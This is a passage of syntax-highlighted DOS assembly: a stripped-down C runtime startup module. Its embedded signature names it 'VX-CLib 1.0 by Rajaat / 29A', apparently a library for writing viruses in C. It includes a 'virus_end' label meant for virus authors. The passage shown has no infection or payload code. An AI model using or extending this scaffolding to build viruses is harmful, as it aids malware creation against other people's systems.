                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">; set BP to 0 for overlay mgr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DGROUP@@</span><span class="sc0">

</span><span class="sc1">;       ExitCode = main(argc,argv,envp);</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__setupio</span><span class="sc0">                  </span><span class="sc1">;===( Done manually! )=========</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">LDATA</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0environ</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0environ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0argv</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0argv</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0environ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__C0argv</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__C0argc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_main</span><span class="sc0">

</span><span class="sc1">;       Flush and close streams and files</span><span class="sc0">
</span><span class="sc5">_exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_abort</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">InitFailed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_pspseg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">__terminate</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__checknull</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__restorezero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__cleanup</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       _cleanup()      call all #pragma exit cleanup routines.</span><span class="sc0">
</span><span class="sc1">;       _checknull()    check for null pointer zapping copyright message</span><span class="sc0">
</span><span class="sc1">;       _terminate(int) exit program with error code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       These functions are called by exit(), _exit(), _cexit(),</span><span class="sc0">
</span><span class="sc1">;       and _c_exit().</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">STARTX</span><span class="sc0">          </span><span class="sc9">ENDP</span><span class="sc0">

        </span><span class="sc9">SUBTTL</span><span class="sc0">  </span><span class="sc5">Vector</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc4">/</span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc5">default</span><span class="sc0"> </span><span class="sc5">Zero</span><span class="sc0"> </span><span class="sc5">divide</span><span class="sc0"> </span><span class="sc5">routines</span><span class="sc0">
        </span><span class="sc9">PAGE</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; The DGROUP@ variable is used to reload DS with DGROUP</span><span class="sc0">

</span><span class="sc5">_DSEG</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">DGROUP@</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc5">__PASCAL__</span><span class="sc0">

</span><span class="sc1">; __MMODEL is used to determine the memory model or the default</span><span class="sc0">
</span><span class="sc1">; pointer types at run time.</span><span class="sc0">

                </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">__MMODEL</span><span class="sc0">
</span><span class="sc5">__MMODEL</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">MMODEL</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">

                </span><span class="sc9">SUBTTL</span><span class="sc0">  </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc5">Up</span><span class="sc0"> </span><span class="sc5">Data</span><span class="sc0"> </span><span class="sc5">Area</span><span class="sc0">
                </span><span class="sc9">PAGE</span><span class="sc0">
</span><span class="sc1">;[]------------------------------------------------------------[]</span><span class="sc0">
</span><span class="sc1">;|      Start Up Data Area                                      |</span><span class="sc0">
</span><span class="sc1">;|                                                              |</span><span class="sc0">
</span><span class="sc1">;|      WARNING         Do not move any variables in the data   |</span><span class="sc0">
</span><span class="sc1">;|                      segment unless you're absolutely sure   |</span><span class="sc0">
</span><span class="sc1">;|                      that it does not matter.                |</span><span class="sc0">
</span><span class="sc1">;[]------------------------------------------------------------[]</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0">

</span><span class="sc1">;       Magic symbol used by the debug info to locate the data segment</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">DATASEG@</span><span class="sc0">
</span><span class="sc5">DATASEG@</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       Miscellaneous variables</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_C0argc</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">dPtrPub@</span><span class="sc0">        </span><span class="sc5">_C0argv</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                      </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">dPtrPub@</span><span class="sc0">        </span><span class="sc5">_C0environ</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                      </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_envLng</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_envseg</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_envSize</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_psp</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_version</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">&gt;,</span><span class="sc0">           </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_osversion</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">&gt;,</span><span class="sc0">           </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_osmajor</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_osminor</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">errno</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_StartTime</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">             </span><span class="sc5">__CDECL__</span><span class="sc0">



</span><span class="sc1">;       Memory management variables</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">LDATA</span><span class="sc0">  </span><span class="sc9">EQ</span><span class="sc0">  </span><span class="sc5">false</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">__heapbase</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">edata@</span><span class="sc4">&gt;,</span><span class="sc0">   </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">__HUGE__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">__brklvl</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">edata@</span><span class="sc4">&gt;,</span><span class="sc0">   </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_heapbase</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">       </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_brklvl</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">       </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_heaptop</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">       </span><span class="sc5">__CDECL__</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">pspseg</span><span class="sc0">          </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">&gt;,</span><span class="sc0">       </span><span class="sc5">__CDECL__</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_CVTSEG</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_RealCvtVector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc4">&gt;,</span><span class="sc0">  </span><span class="sc5">__CDECL__</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_SCNSEG</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">_ScanTodVector</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">&gt;,</span><span class="sc0">  </span><span class="sc5">__CDECL__</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">__HUGE__</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">SEGMENT</span><span class="sc0">

</span><span class="sc1">;=====( Sorry, I could not resist putting my name in it )======================</span><span class="sc0">

</span><span class="sc5">Signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[ VX-CLib 1.0 by Rajaat / 29A ]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">bdata@</span><span class="sc0">          </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;=====( This might come in handy ;-)===========================================</span><span class="sc0">

</span><span class="sc5">PubSym@</span><span class="sc0">         </span><span class="sc5">virus_end</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc4">&lt;</span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc4">&gt;,</span><span class="sc0">   </span><span class="sc5">__CDECL__</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_BSSEND</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc5">edata@</span><span class="sc0">          </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">STARTX</span><span class="sc0">
</span></div></body>
</html>
